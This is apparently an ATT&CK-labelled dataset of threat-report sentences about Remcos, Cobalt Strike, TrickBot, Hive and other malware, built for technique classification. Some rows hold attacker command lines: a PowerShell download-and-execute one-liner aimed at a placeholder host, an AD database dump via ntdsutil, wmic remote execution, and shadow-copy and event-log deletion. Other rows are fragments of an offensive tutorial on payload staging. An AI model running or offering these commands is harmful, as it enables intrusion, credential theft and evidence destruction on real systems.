Sending back the result of the command’s execution to the C2 server.,"T1041, T1573.001"
"The commands retrieved from the server are also encrypted with AES-128, with the key stored in the command’s file itself.",T1573.001
We found the following list of supported commands: Get list of drives; Get content list from a specified directory; Download a file from the C2 server; Write text to a given *.bat file and execute it; Run a shell command.,"T1105, T1083, T1059.003"
The following are examples of command lines that portray some of the methods and actions taken by the operators of this threat activity to achieve their goals: Attempts to enumerate hosts and gather network information: cmd /C,"T1033, T1059.003"
"""C: & cd \ & whoami"" cmd /C","T1033, T1059.003"
"""C: & cd \ & net view"" cmd /C",T1059.003
"""C: & cd \ & -setcp 866"" cmd /C",T1059.003
"""C: & cd \ & netstat -ano"" cmd /C",T1083
"""C: & cd \ & dir $temp\ /od"" cmd /C",T1059.003
"""C: & cd \ & arp -a"" cmd /C","T1057, T1016"
"""C: & cd \ & tasklist"" cmd /C","T1057, T1059.003"
"""C: & cd \ & tracert <redacted_internal_ip>"" cmd /C",T1059.003
"""C: & cd \ & net use \\<redacted_internal_ip> /u:<redacted_username> <redacted_password>"" cmd /C",T1059.003
"""C: & cd \ & net view \\<redacted_internal_ip>"" cmd /C",T1059.003
"""C: & cd \ & ping -n 1 -a <redacted_internal_ip>"" cmd /C",T1059.003
"""C: & cd \ & net use * /d /y"" cmd /C",T1082
"""C: & cd \ & systeminfo"" Copying of files across SMB shares, followed by an attempt to dump the Active Directory domain database (tid): cmd /C","T1570, T1059.003, T1082"
"i ntds\"" \""ifm\"" \""create full $temp\1\\\"" q q >$temp\a.bat cmd /C",T1059.003
"""C: & cd \ & type $temp\a.bat cmd /C",T1059.003
"2>$temp\TS_P34H.tmp"" $temp\TS_P61S.tmp -accepteula -d -s \\<redacted_internal_ip3>\ cmd /c ""ping -n 2 -a <redacted_internal_ip2>>$temp\TS_P34H.tmp"" Usage of WMI for remote command execution: wmic /node:<redacted_internal_ip1> /user:<redacted_group>\<redacted_user>",T1047
"/password:<readcted_password> process call create ""cmd /c ping -n 1 -a <redacted_internal_ip4> >$temp\a.tmp wmic /node:<redacted_internal_ip2> /user:<redacted_group>\<redacted_user>",T1070.004
"/password:<readcted_password> process call create ""cmd /c netstat -ano >$temp\a.tmp wmic /node:<redacted_internal_ip2> /user:<redacted_group>\<redacted_user>",T1070.004
"/password:<readcted_password> process call create ""cmd /c tracert <redacted_internal_ip4>>$temp\a.tmp wmic /node:<redacted_internal_ip3> /user:<redacted_group>\<redacted_user>",T1070.004
>$temp\a.tmp wmic /node:<redacted_internal_ip3> /user:<redacted_group>\<redacted_user,T1070.004
"> /password:<readcted_password> process call create ""cmd /c qwinsta >$temp\a.tmp wmic /node:<redacted_internal_ip3> /user:<redacted_group>\<redacted_user>",T1070.004
"/password:<readcted_password> process call create ""cmd /c net user administrator >$temp\a.tmp wmic /node:<redacted_internal_ip3> /user:<redacted_group>\<redacted_user>",T1070.004
"/password:<readcted_password> process call create ""cmd /c net user admin >$temp\a.tmp Removal of artefacts from the system: cmd /C","T1059.003, T1070.004"
"""C: & cd \ & dir $temp\*.hive"" cmd /C",T1059.003
"""C: & cd \ & del $temp\*.hive"" cmd /C",T1059.003
"""C: & cd \ & dir $temp\*.log"" cmd /C",T1059.003
"""C: & cd \ & type $temp\silconfig.log"" File archiving of remotely collected files, some of which contain *.hive files, possibly for LSA secrets dumping, with the exe command line utility: cmd /C",T1059.003
"The malicious MSBuild files we observed in this campaign contained encoded executables and shellcode, with some, hosted on Russian image-hosting site, “joxi[.]net.”",T1027
"Figure 1 - Infection chain Technical Analysis MSBuild MSBuild is a development tool used for building applications, especially where Visual Studio is not installed.[2] MSBuild uses XML project files that contain the specifications to compile the project and, within the configuration file, the “UsingTask” element defines the task that will be compiled by MSBuild.",T1053.005
"In addition, MSBuild has an inline task feature that enables code to be specified and compiled by MSBuild and executed in memory.",T1053.005
"For persistence, mshta is used to execute a vbscript that runs the project file, with a shortcut file (.lnk) added to the startup folder (Figure 3).",T1547.001
"File Created in Startup Folder Following the creation of persistence, two large arrays of decimal bytes were decoded by the function shown in Figure 4. Figure 4 - Decoding Function Porting the decoding function to Python, we created a script (Figure 5 below).",T1140
"After being copied into memory, the shellcode was executed using the callback function pointer in CallWindowProc, shown in Figure 6 below.",T1106
"Figure 6 - Shellcode and Payload Being Loaded Into Memory Figure 7 - Encoded shellcode in Project File The shellcode (encoded shown in Figure 7 above) calls, shown in Figure 8 below, were mainly: LoadLibraryW, VirtualAlloc, CreateProccessW, and ZwUnmapViewOfSection.","T1027, T1106"
"LoadLibraryW loads the module, VirtualAlloc allocates the memory, CreateProcessW created a process, and ZwUnmapViewOfSection is used to unmap memory from a virtual space.",T1106
These were used to inject the payload into process memory.,T1055
Figure 8 - Calls made by the shellcode Payloads RemcosRAT Analyzed File – MD5 – 04fc0ca4062dd014d64dcb2fe8dbc966 The payload from the project files was a remote access tool (RAT) called Remcos.,T1219
"The software, written in C++, enables full access to the infected machine with features including, but not limited to: Anti-AV Credential harvesting Gathering system information Keylogging Persistence Screen capture Script execution The themes used by actors to distribute Remcos have varied, including changes designed to adapt to themes or timeframes.","T1056.001, T1113, T1082"
The persistence technique is simply adding a run registry key for persistence (Figure 11).,T1547.001
Figure 9 - Remcos Version 2.6.0 Being Used Figure 10 - connecting to C2 Figure 11 - Adds Run Registry Key for Persistence Figure 12 - Watchdog Module Figure 12 shows the “Watchdog” module which restarts Remcos in the event the program is terminated.,T1547.001
Webcam Capture Remote Command Line Clear Logins Remote Chat File Manager Remote Input Microphone Capture SOCKS Proxy Keylogger Login Cleaner Screen Logger Local Utilities Browser History Registry Editor Password Recovery Visibility mode RedLine Stealer Analyzed File – rehoboams.exe MD5 – 6d3e8a2802848d259a3baaaa78701b97,"T1112, T1059.003, T1113, T1056.001"
"RedLine Stealer is written in .NET and has been observed stealing multiple types of data (full list shown in Table 2 below), including: : Cookies Credentials (chat clients, VPNs, crypto wallets, browser )",T1005
"Crypto wallet NordVPN (existence of and credentials) Stored web browser information (credit card, username, and password)",T1082
"System Information RedLine will search for the existence of multiple products that include cryptocurrency software, messaging apps, VPNs, and web browsers (full list shown in Table 2 below).",T1082
"The Beacon payload is used to model advanced APT malware, and can do the following: Receive commands (either passively or from an interactive console) Egress communications over HTTP, HTTPS, and DNS Launch PowerShell Execute binaries Modify and query the Windows registry Inject malicious code into legitimate processes Log keystrokes Take screenshots Set up proxies Escalate privileges Bypass UAC Dump password hashes Scan ports among other abilities This tool is mainly used in red team operations for government agencies and private enterprises, but it’s also a popular tool leveraged by cybercrime and APT groups in cracked versions.","T1056.001, T1548.002, T1112, T1071.001, T1090, T1113, T1012, T1055"
Cobalt Strike payloads are usually shellcode encrypted with a rolling XOR key.,T1027
"Depending on how the code is delivered, the code can be injected into other legitimate running processes, bypassing defenses that do not scan legitimate processes or code in-memory.",T1055
The TEARDROP dropper is a memory-only DLL that runs as a service spawning a thread that pulls the Cobalt Strike payload from a fake JPG file.,"T1027, T1543.003"
"It uses a different custom packer than TEARDROP, also leveraging steganography to locate the start of the encoded payload.",T1027
"Once the encoded payload has been located, it extracts, decrypts, and decompresses the data to be executed as shellcode.","T1027, T1140"
"The payload, usually shellcode, is injected into another process.",T1055
"Project file codeAs shown above, the project file has an encoded and compressed payload.",T1027
"This payload is decrypted, decompressed, and then copied into memory.",T1140
The shellcode is then executed in a new thread.,T1055
An endpoint with a system injected with Cobalt Strike via MSBuild is shown below.,T1055
This requires either social engineering tactics to get the target to execute the malware or another program/script to execute the file.,T1204.002
"Once the shellcode is written to the named pipe, it is decrypted and executed in a separate thread.",T1140
"The use of shellcode, encoding, compression, obfuscated strings, process injection, hashing algorithms, domain fronting, different communication channels, and dynamically loaded libraries all give malware and network defenses a run for their money.","T1090, T1027, T1055"
"Using hash-based identification of Cobalt Strike is insufficient, since each payload will be encrypted with different keys and each configuration will uniquely change the hash value.",T1027
Encrypted payloads will also obfuscate useful strings from static analysis.,T1027
"Signature-based detection is great for detecting malware, but due to the versatility of Cobalt Strike’s deployment using multiple stages and encrypted/obfuscated payloads, an analyst may only be able to detect that a file is going to load and execute a payload in-memory.",T1027
"Dynamic analysis can get the malware to unpack, decode, or download additional stages.","T1105, T1027, T1140"
Intezer Analyze result showing in-memory Cobalt Strike codeThe document drops and executes Cobalt Strike in the memory space of “rundll32.exe.”,T1218.011
"TTPs section showing capabilities detected during executionThe document displays interesting techniques such as macros with auto-execution, network activity with a unique user agent, office process starting martian subprocess, and process injection.",T1055
"Attacks The C2 network protocol used in previous campaigns remains essentially unchanged, with additional commands added to support the Telnet brute force.",T1110
0x01: Keep-Alive/Do nothing 0x02: Stop all DoS attacks and terminate the client 0x03: Perform a DoS attack 0x04: Stop all DoS attacks 0x06: Restart Telnet brute forcing 0x07: Stop Telnet brute forcing The previously reported RapperBot campaign was limited to a few generic DoS methods against TCP and UDP services.,T1110
"Multi Player (SA:MP) 0x05: GRE Ethernet flood 0x06: GRE IP flood 0x07: Generic TCP flood These specific commands, coupled with the absence of HTTP-related DDoS attacks, suggests that this campaign is primarily geared toward game server DDoS. Telnet Self-propagation The most significant difference in the new campaign was the complete replacement of the SSH brute forcing code with the more usual Telnet equivalent.",T1110
"FortiGuard Labs has observed similar drastic modifications within RapperBot samples, as detailed in our previous report, adding and removing even DoS attack code on an apparent whim.",T1110
The Telnet brute forcing code is designed primarily for self-propagation and resembles the old Mirai Satori botnet.,T1110
"Unlike the earlier SSH brute-forcing campaign, the plaintext credentials are embedded into the malware instead of being downloaded from the C2.","T1078, T1110"
These credentials used appear to be default credentials for IoT devices.,T1078
"To optimize brute forcing efforts, the malware compares the server prompt upon connection to a hardcoded list of strings to identify the possible device and then only tries the known credentials for that device.",T1110
"It attempts to specifically gain root access to these devices via a default password, despite having the same credentials in the list embedded in the binary.","T1078, T1110"
"Like the earlier SSH brute-forcing campaign, once it has successfully gained access, it sends the credentials used, the compromised device’s IP address, and its architecture to the C2 server on a separate port, 5123.",T1110
This allows it to download and deploy a RapperBot payload of the correct architecture to ensure proper execution.,T1105
"This selective behavior is more efficient than the shotgun approach in most IoT malware families, whereby all the binaries for the supported architectures are downloaded and executed in the victim's system.",T1105
"The bot then downloads its payload via software installed on the compromised device, such as ftpget, wget, curl, or tftp, before executing the payload.",T1570
"If none of the software mentioned above is installed, it will extract and send an embedded binary downloader to the compromised device that executes and downloads the primary payload.",T1105
No attempts to persist on infected or brute-forced devices were observed for this campaign.,T1110
"The C2 commands and corresponding IDs are identical in both campaigns (excluding the Telnet-related commands, as those do not apply to RapperBot) Both campaigns show a certain degree of effort in optimizing the brute forcing implementation.",T1110
Code for the brute forcing implementation is significantly more structured than typical IoT malware that copies and pastes code with minimal modifications.,T1110
Here we can see how this code comparing the local IP address with a predefined list of network addresses typically associated with sandboxed environments.,T1016
It uses the cpuinfo Python module to retrieve information about the CPU.,T1082
if disk_size_gb > min_disk_size_gb: return False # Proceed else: return True # Not Proceed This code checks if the disk size is greater than a specified threshold (50 GB as example).,T1082
It uses the win32api.,"T1106, T1082"
GetDiskFreeSpaceEx() function to retrieve the disk size in bytes.,"T1106, T1082"
"To achieve this, we’ll encrypt the token and upload it to a file-sharing service like transfersh.com The script will download and decrypt the string that represents the token.",T1140
"This decryption process utilizes the Fernet algorithm, ensuring the secure retrieval and utilization of the token.","T1573.001, T1140"
Fernet is a symmetric encryption algorithm and token format used for secure communication and data protection.,T1573.001
"It utilizes symmetric key cryptography, where the same secret key is used for both encryption and decryption.",T1573.001
The provided code includes two functions: fernet_decrypt and get_auth_token.,T1140
The fernet_decrypt function decrypts an encrypted string representing the Ngrok AUTH Token using a harcoded password.,T1140
It returns the decrypted message as a decoded string.,T1140
"If the response is successful, it use the harcoded password for decryption using the fernet_decrypt function, and returns the decrypted AUTH Token.",T1140
Nuitka Compiler employs various optimization techniques and obfuscation mechanisms during the compilation process.,T1027
"These languages allow direct memory manipulation, access to system APIs, and the ability to write efficient and optimized code.",T1106
"Attackers are using LNK files to download malware or other malicious files by leveraging legitimate native apps, such as PowerShell.",T1105
"For instance, this is a PowerShell one-liner that can be used to download and execute a remote .ps1 or .exe file: powershell ""IEX(New-Object Net.",T1105
"WebClient).downloadString('http://IP:PORT/malicious.ps1')"" The .ps1 file could be a simple stager download of an .exe file and its execution.",T1105
"In this case, the PowerShell one-liner will find, decrypt, and execute code appended to the original file.",T1140
https://transfersh.com/WindowsUpdate Output: https://transfersh.com/XXXXXXXX/WindowsUpdate After one download the file will be deleted and link will returns a 404 error.,T1070.004
ShellExecute($file),T1059.003
This is a simple PowerShell script that downloads a file from a fixed location and executes it.,T1105
$url = 'https://transfersh.com/ZZZZZZZ/WindowsUpdate' This line sets the value of the $url variable to the URL of the file to be downloaded.,T1105
This line uses the DownloadFile method of the WebClient object to download the file from the specified URL and save it to the specified local file path.,T1105
The Shell.,T1059.003
Application object provides methods for working with the Windows shell.,T1059.003
This line uses the ShellExecute method of the Shell.,T1059.003
Application object to execute the downloaded file.,T1059.003
The PE file is downloaded on filesystem and than executed.,T1105
"To enhance operational security, we can employ a clever alternative approach that eliminates the need to download files directly onto the victim’s computer: PE reflective injection.",T1055
Reflective PE injection Reflective PE injection is a technique used by malware or advanced attackers to inject a Portable Executable (PE) file directly into the memory of a running process without the need for writing the file to disk.,T1055
"Unlike traditional injection methods, which involve loading an external DLL or injecting code into the target process, reflective PE injection allows the malware to load and execute its code directly from memory.",T1055
This technique is often employed to bypass security mechanisms that monitor or block external DLL loading or code injection.,T1055
"In reflective PE injection, the PE file is parsed and its sections are reconstructed in the target process’s memory.",T1055
"By doing so, the injected code can appear as a legitimate part of the process, making it more difficult to detect and analyze.",T1055
"Once the PE file is injected and reconstructed in memory, the execution flow can be redirected to the injected code, enabling the malware to operate within the context of the compromised process.",T1055
PowerSploit does provide a module called “Invoke-ReflectivePEInjection” that facilitates reflective PE injection using PowerShell.,T1055
"This module allows the injection of a PE file into a remote or local process’s memory without writing it to disk, but being a well-known and widely-used tool, it has gained significant attention from security vendors and technologies, including the Antimalware Scan Interface (AMSI).",T1055
"In this post, we offer a technical analysis of the CatB ransomware and its abuse of the legitimate MSDTC service, describing its evasion tactics, encryption behavior, and its attempts to steal credentials and browser data.",T1552.001
Key file dropped for each victim Example CatB ‘key’ file Credential and Browser Data Theft,T1552.001
This includes browser session and credential data.,T1552.001
"It verifies that the domain name of the current device meets the following conditions: The domain must not contain certain strings; the check for these strings is implemented via hashes, so at this time the domain names that are block-listed are unknown The domain must not contain “solarwinds” The domain must not match the regular expression (?i)([^a-z]|^)(test)([^a-z]|$), or in simpler terms, it must not look like a test domain It checks that there are no running processes related to security-related software (e.g., Windbg, Autoruns, Wireshark)",T1518.001
"It checks that there are no drivers loaded from security-related software (e.g., groundling32.sys)",T1518.001
"It checks that the status of certain services belonging to security-related software meets certain conditions (e.g., windefend, sense, cavp)",T1518.001
"The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it’s executing from a trusted, signed binary.","T1112, T1070.004"
"In its first step, the backdoor initiates a connection to a predefined C2 server to report some basic information about the compromised system and receive the first commands.",T1005
It is computed by hashing the following data: The physical address of the network interface The domain name of the device The content of the MachineGuid registry value from the key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography The backdoor also generates a pseudo-random URI that is requested on the C2 domain.,"T1012, T1082"
"Like the domain, the URI is composed using a set of hardcoded keywords and paths, which are chosen partly at random and partly based on the type of HTTP request that is being sent out.",T1071.001
"The backdoor accepts the following commands: Idle Exit SetTime CollectSystemDescription UploadSystemDescription RunTask GetProcessByDescription KillTask GetFileSystemEntries WriteFile FileExists DeleteFile GetFileHash ReadRegistryValue SetRegistryValue DeleteRegistryValue GetRegistrySubKeyAndValueNames Reboot None In a nutshell, these commands allow the attackers to run, stop, and enumerate processes; read, write, and enumerate files and registry keys; collect and upload information about the device; and restart the device, wait, or exit.","T1057, T1070.004, T1112, T1012, T1005"
"The command CollectSystemDescription retrieves the following information: Local Computer Domain name Administrator Account SID HostName Username OS Version System Directory Device uptime Information about the network interfaces Resulting hands-on-keyboard attack Once backdoor access is obtained, the attackers follow the standard playbook of privilege escalation exploration, credential theft, and lateral movement hunting for high-value accounts and assets.","T1083, T1033, T1082"
"To avoid detection, attackers renamed Windows administrative tools like adfind.exe which were then used for domain enumeration.","T1059.003, T1036.005"
C:\Windows\system32\cmd.exe /C,T1059.003
"Name,$definition,6,”System”,$null,5);echo “Done” C:\Windows\system32\cmd.exe /C schtasks /create /F","T1059.003, T1053.005"
/tn “\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager” /tr,T1053.005
“C:\Windows\SoftwareDistribution\EventCacheManager.exe” /sc ONSTART /ru system /S,T1053.005
"file], [various exports] With Rundll32, each compromised device receives a unique binary hash, unique local filesystem path, pseudo-unique export, and unique C2 domain.",T1218.011
"“Horabot enables the threat actor to control the victim’s Outlook mailbox, exfiltrate contacts’ email addresses, and send phishing emails with malicious HTML attachments to all addresses in the victim’s mailbox,” researchers said.",T1566.001
"“The banking trojan can collect the victim’s login credentials for various online accounts, operating system information and keystrokes.","T1056.001, T1082"
This then delivers a malicious payload via a PowerShell downloader script.,T1027
"“When a victim opens the HTML file attachment, an embedded URL is launched in the victim’s browser, redirecting to another malicious HTML file from an attacker-controlled AWS EC2 instance,” researchers said in a blog post.",T1027
"“After the victim’s machine is rebooted, the malicious Windows startup files run the payloads by sideloading them to the legitimate executables and downloading and executing two other PowerShell scripts from a different attacker-controlled server,” the blog post explained.","T1574.002, T1105"
"This trojan enables the attacker to monitor activity on a victim’s device by collecting system information such as hostnames, IPv4 addresses, OS version information, and insights on anti-virus software present on the machine.","T1016, T1518.001, T1082"
"Data gathered by the trojan is then extracted to an attacker-controlled server, researchers added.",T1041
"“The reconnaissance data is exfiltrated to the attacker-controlled server through an HTTP POST request,” Talos explained “The banking trojan targets the victim’s sensitive information, such as login credentials and financial transaction security codes, and logs keystrokes and manipulates the victim machine’s clipboard data.","T1041, T1005, T1056.001, T1071.001"
"“The spam tool is a 32-bit DLL written in Delphi and, when run on the victim’s machine, will attempt to compromise the victim’s login credentials for webmail services such as Yahoo, Gmail, and Hotmail,” Cisco analysts explained.",T1078
"Once user credentials have been compromised, this tool takes “full control” of the account and begins creating and circulating spam emails to contacts found in the victim’s mailbox.",T1078
"This spambot also displayed “information-stealing capabilities”, including the ability to log keystrokes, capture screenshots, and track mouse activity on an infected computer.","T1113, T1056.001"
"Hive actors have also gained initial access to victim networks by distributing phishing emails with malicious attachments [T1566.001] and by exploiting the following vulnerabilities against Microsoft Exchange servers [T1190]: CVE-2021-31207 - Microsoft Exchange Server Security Feature Bypass Vulnerability CVE-2021-34473 - Microsoft Exchange Server Remote Code Execution Vulnerability CVE-2021-34523 - Microsoft Exchange Server Privilege Escalation Vulnerability After gaining access, Hive ransomware attempts to evade detention by executing processes to: Identify processes related to backups, antivirus/anti-spyware, and file copying and then terminating those processes to facilitate file encryption [T1562].","T1057, T1190, T1518.001, T1566.001, T1068"
Stop the volume shadow copy services and remove all existing shadow copies via vssadmin on command line or via PowerShell,T1059.003
"Prior to encryption, Hive ransomware removes virus definitions and disables all portions of Windows Defender and other common antivirus programs in the system registry [T1112].",T1562.001
"Table 2: Known IOCs as of November 2022 Known IOCs - Files HOW_TO_DECRYPT.txt typically in directories with encrypted files *.key typically in the root directory, i.e., C:\ or /root hive.bat shadow.bat asq.r77vh0[.]pw - Server hosted malicious HTA file asq.d6shiiwz[.]pw - Server referenced in malicious regsvr32 execution asq.swhw71un[.]pw - Server hosted malicious HTA file asd.s7610rir[.]pw - Server hosted malicious HTA file Windows_x64_encrypt.dll Windows_x64_encrypt.exe Windows_x32_encrypt.dll Windows_x32_encrypt.exe Linux_encrypt Esxi_encrypt Known IOCs – Events System, Security and Application Windows event logs wiped Microsoft Windows Defender AntiSpyware Protection disabled Microsoft Windows Defender AntiVirus Protection disabled Volume shadow copies deleted Normal boot process prevented Known IOCs – Logged Processes wevtutil.exe cl system wevtutil.exe cl security wevtutil.exe cl application vssadmin.exe delete shadows /all","T1562.001, T1057"
This could cause the file to run when double-clicked instead of opening it with a PDF viewer.,T1204.002
"OdicLoader drops a decoy PDF document, displays it using the system’s default PDF viewer (see Figure 2), and then downloads a second-stage backdoor from the OpenDrive cloud service.",T1105
"The decryption routine shared between the BADCALL for Linux and targeted destructive malware for Windows from 2014 Additional attribution data points To recap what we’ve covered so far, we attribute the 3CX supply-chain attack to the Lazarus group with a high level of confidence.",T1140
This is based on the following factors: Malware (the intrusion set): The IconicLoader (samcli.dll) uses the same type of strong encryption – AES-GCM – as SimplexTea (whose attribution to Lazarus was established via the similarity with BALLCALL for Linux); only the keys and initialization vectors differ.,T1027
"Technical DetailsTrickBot is an advanced Trojan that malicious actors spread primarily by spearphishing campaigns using tailored emails that contain malicious attachments or links, which—if enabled—execute malware (Phishing:",T1566.001
The phishing emails contain links that redirect to a website hosted on a compromised server that prompts the victim to click on photo proof of their traffic violation.,T1204.002
"In clicking the photo, the victim unknowingly downloads a malicious JavaScript file that, when opened, automatically communicates with the malicious actor’s command and control (C2) server to download TrickBot to the victim’s system (Command and Scripting Interpreter:",T1204.002
"Additionally, some of TrickBot’s modules spread the malware laterally across a network by abusing the Server Message Block (SMB) Protocol.",T1570
"TrickBot is capable of data exfiltration over a hardcoded C2 server, cryptomining, and host enumeration (e.g., reconnaissance of Unified Extensible Firmware Interface or Basic Input/Output System [UEFI/BIOS] firmware) (Exfiltration Over C2 Channel",T1041
Spearphishing Attachment T1566.001 TrickBot has used an email with an Excel sheet containing a malicious macro to deploy the malware.,T1566.001
Task T1053.005 TrickBot creates a scheduled task on the system that provides persistence.,T1053.005
"Native API T1106 TrickBot uses the Windows Application Programming Interface (API) call, CreateProcessW(), to manage execution flow.",T1106
User Execution: Malicious File T1204.002 TrickBot has attempted to get users to launch malicious documents to deliver its payload.,T1204.002
Persistence [TA0003] Technique Title ID Use Scheduled Task/Job: Scheduled Task T1053.005 TrickBot creates a scheduled task on the system that provides persistence.,T1053.005
Windows Service T1543.003 TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots. Privilege Escalation,T1543.003
Process Injection: Process Hollowing T1055.012 TrickBot injects into the svchost.exe process.,T1055
Windows Service T1543.003 TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots.,T1543.003
[TA0005] Technique Title ID Use Obfuscated Files or Information T1027 TrickBot uses non-descriptive names to hide functionality and uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.,T1027
Obfuscated Files or Information: Software Packing T1027.002 TrickBot leverages a custom packer to obfuscate its functionality.,T1027
Modify Registry T1112 TrickBot can modify registry entries.,T1112
Deobfuscate/Decode Files or Information T1140 TrickBot decodes the configuration data and modules.,T1140
Impair Defenses: Disable or Modify Tools T1562.001 TrickBot can disable Windows Defender.,T1562.001
[TA0006] Technique Title ID Use Input Capture: Credential API Hooking T1056.004 TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API.,T1106
"Unsecured Credentials: Credentials in Files T1552.001 TrickBot can obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP.",T1552.001
"Additionally, it searches for the .vnc.lnk affix to steal VNC credentials.",T1552.001
"Unsecured Credentials: Credentials in Registry T1552.002 TrickBot has retrieved PuTTY credentials by querying the Software\SimonTatham\Putty\Sessions registry key. Credentials from Password Stores T1555 TrickBot can steal passwords from the KeePass open-source password manager. Credentials from Password Stores: Credentials from Web Browsers T1555.003 TrickBot can obtain passwords stored in files from web browsers such as Chrome, Firefox, Internet Explorer, and Microsoft Edge, sometimes using esentutl.","T1552.001, T1012"
"System Network Configuration Discovery T1016 TrickBot obtains the IP address, location, and other relevant network information from the victim’s machine.",T1016
System Owner/User Discovery T1033 TrickBot can identify the user and groups the user belongs to on a compromised host.,T1033
"System Information Discovery T1082 TrickBot gathers the OS version, machine name, CPU type, amount of RAM available from the victim’s machine.",T1082
"File and Directory Discovery T1083 TrickBot searches the system for all of the following file extensions: .avi, .mov, .mkv, .mpeg, .mpeg4, .mp4, .mp3, .wav, .ogg, .jpeg, .jpg, .png, .bmp, .gif, .tiff, .ico, .xlsx, and .zip.",T1083
Lateral Movement [TA0008] Technique Tactic ID Use Lateral Tool Transfer T1570 Some TrickBot modules spread the malware laterally across a network by abusing the SMB Protocol.,T1570
Collection [TA0009] Technique Tactic ID Use Data from Local System T1005 TrickBot collects local files and information from the victim’s local machine.,T1005
Input Capture:Credential API Hooking T1056.004 TrickBot has the ability to capture Remote Desktop Protocol credentials by capturing the CredEnumerateA API. Person in the Browser T1185 TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified webpage. Command and Control,T1106
"Application Layer Protocol: Web Protocols T1071.001 TrickBot uses HTTPS to communicate with its C2 servers, to get malware updates, modules that perform most of the malware logic and various configuration files.",T1071.001
Ingress Tool Transfer T1105 TrickBot downloads several additional files and saves them to the victim's machine.,T1105
Non-Standard Port T1571 Some TrickBot samples have used HTTP over ports 447 and 8082 for C2.,T1071.001
Symmetric Cryptography T1573.001 TrickBot uses a custom crypter leveraging Microsoft’s CryptoAPI to encrypt C2 traffic.,"T1573.001, T1106"
Exfiltration [TA0010] Technique Tactic ID Use Exfiltration Over C2 Channel T1041 TrickBot can send information about the compromised host to a hardcoded C2 server.,T1041
